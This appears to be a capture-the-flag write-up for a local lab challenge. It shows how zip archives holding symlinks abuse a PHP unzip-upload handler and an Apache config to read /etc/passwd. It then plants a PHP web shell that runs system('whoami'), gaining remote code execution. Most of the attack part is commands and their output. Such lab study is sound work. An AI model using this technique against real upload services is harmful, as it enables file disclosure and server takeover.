@@ -1,0 +1,136 @@
+[Symlink Attack Challenge]
+
+[*] Target: http://localhost:9091
+
+    - Nothing too special in this code, just unzip the uploaded file in a specific folder:
+
+        ...
+        if(isset($_FILES["file"])) {
+            try {
+                // Fixed: Dont save file to user's directory, only use tmp_name
+                // unzip the file
+                $name = '/tmp/name';
+                move_uploaded_file($_FILES["file"]["tmp_name"], $name);
+
+                $cmd = "unzip " . $name . " -d " . $dir;
+                $debug = shell_exec($cmd);
+
+                // Remove /usr/ from directory
+                $user_dir = str_replace("/var/www/html", "", $dir);
+                $success = 'Successfully uploaded and unzip files into <a href="' . $user_dir . '/">' . $user_dir .'</a>';
+                ... 
+                }}
+        ...
+
+    - But focus on the apache2.conf file
+
+        ...
+        <Directory /var/www/>
+                Options Indexes FollowSymLinks 
+    // [?] This allows directory listing (Indexes) and the ability to follow symbolic links (FollowSymLinks).
+                AllowOverride None 
+    // [?] Overrides using .htaccess files are not allowed in this directory.
+                Require all granted
+    // [?] Allows access to all users.
+        </Directory>
+
+        <Directory "/var/www/html/upload/">
+                AllowOverride None
+                Require all granted
+                Options +Indexes
+    // [?] Enables directory listing for this specific directory. 
+        </Directory>
+
+        <Directory ~ "^/var/www/html/upload/[0-9a-fA-F]{32}/.+">
+                AllowOverride None
+                Require all granted
+                ...
+                <FilesMatch ".+\.(html|txt|php)">
+                        Header set Content-Type text/plain
+                </FilesMatch>
+        </Directory>
+
+        <Directory ~ "^/var/www/html/upload/[0-9a-fA-F]{32}/">
+                AllowOverride None
+                Require all granted
+                php_flag engine off
+        </Directory>    
+        
+        ...
+    
+    => I think CBJS wants us to RCE using the symlink attack technique. However, first things first
+
+        RUN echo "CBJS{FAKE_FLAG_FAKE_FLAG}" >> /etc/passwd
+        RUN echo "CBJS{FAKE_FLAG_FAKE_FLAG}" >> /secret.txt
+
+    => I create a symlink to /etc/passwd to read passwd file target machine
+
+    bigbox@ubuntu:~/Desktop$ ln -s /etc/passwd link2passwd
+
+    // [?] -s, --symbolic: make symbolic links instead of hard links
+    
+    bigbox@ubuntu:~/Desktop$ zip -y read.zip link2passwd
+                    adding: link2passwd (stored 0%)
+    
+    // [?] -y: store symbolic links as the link instead of the referenced file
+
+    => After uploading read.zip
+
+        finishing deferred symbolic links:
+        /var/www/html/upload/213a17f811d92a17aa486a9c5bb6480f/link2passwd -> /etc/passwd
+
+    => bigbox@ubuntu:~/Desktop$ curl localhost:9091/upload/213a17f811d92a17aa486a9c5bb6480f/link2passwd
+
+                root:x:0:0:root:/root:/bin/bash
+                daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+                bin:x:2:2:bin:/bin:/usr/sbin/nologin
+                ...
+                gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+                nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+                _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+                CBJS{FAKE_FLAG_FAKE_FLAG}
+
+    - So that is the way to read passwd file, now we should move on to RCE
+
+    - Remember this:
+
+        <Directory ~ "^/var/www/html/upload/[0-9a-fA-F]{32}/.+">
+                AllowOverride None
+                Require all granted
+                ...
+                <FilesMatch ".+\.(html|txt|php)">
+                        Header set Content-Type text/plain
+                </FilesMatch>
+        </Directory>
+
+    => Using the mindset when we combine Path Traversal and File Upload attack, I can create a symlink to /var/www/html and then upload my payload
+
+        bigbox@ubuntu:~/Desktop$ ln -s /var/www/html link2html
+
+        bigbox@ubuntu:~/Desktop$ zip -y link2html.zip link2html
+            adding: link2html (stored 0%)
+
+        => finishing deferred symbolic links: /var/www/html/upload/213a17f811d92a17aa486a9c5bb6480f/link2html -> /var/www/html
+
+    => The next question is "How can we upload a file to link2html"
+    
+    => To solve this problem we should know that our upload file will be transferred to /tmp/name and unzipped to /var/www/html/upload/<random_stuff>/<extracted_things>
+
+    - In this case, we already have link2html as a tunnel to /var/www/html
+
+    => I can perform a recurse zip trick to upload my payload to link2html
+
+            bigbox@ubuntu:~/Desktop/step2$ mkdir link2html
+
+            bigbox@ubuntu:~/Desktop/step2$ cd link2html
+
+            bigbox@ubuntu:~/Desktop/step2/link2html$ touch payload.php
+
+            bigbox@ubuntu:~/Desktop/step2/link2html$ echo "<?php system('whoami'); ?>" >> payload.php
+
+            bigbox@ubuntu:~/Desktop/step2$ zip -r attack.zip link2html/payload.php
+            adding: link2html/payload.php (deflated 23%)
+   
+         =>  inflating: /var/www/html/upload/213a17f811d92a17aa486a9c5bb6480f/link2html/payload.php  
+
+    [Final Result: RCE] curl http://localhost:9091/payload.php => www-data
